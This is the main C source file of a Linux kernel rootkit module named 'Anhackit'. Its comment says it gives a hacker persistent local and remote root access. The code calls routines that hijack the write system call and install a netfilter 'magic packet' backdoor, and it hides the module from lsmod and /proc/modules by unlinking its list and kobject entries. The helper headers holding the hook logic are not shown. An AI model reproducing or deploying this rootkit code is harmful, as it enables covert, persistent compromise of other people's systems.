#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

/*
    Anhackit kernel module - Developed by Anhackin

    A simple rootkit in a kernel module that allow hacker
    to maintain a local and remote root access
*/

//Load config file
#include "conf.h"

//Load the sys call hijacker
#include "syscall.h"

//Load the netfilter backdoor
#include "nfilter.h"

//Init kernel module
static int __init anhackit_start(void) {
    //Load
    hijack_write_sys_call();
    load_magic_packet_hook();

    //Hide module from lsmod /proc/modules if DEBUG == 0
    #ifndef DEBUG
        list_del_init(&__this_module.list);
        kobject_del(&__this_module.mkobj.kobj);
        list_del(&__this_module.mkobj.kobj.entry);
    #endif

    //Debug
    #ifdef DEBUG
        printk("anhackit - rootkit loaded!\n");
    #endif

    return 0;
}

//Exit kernel module
static void __exit anhackit_end(void) {
    //Unload
    clean_write_sys_call();
    unload_magic_packet_hook();

    //Debug
    #ifdef DEBUG
      printk("anhackit - rootkit unloaded!\n");
    #endif
}

//Config kernel module
module_init(anhackit_start);
module_exit(anhackit_end);

//About
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anhackin");
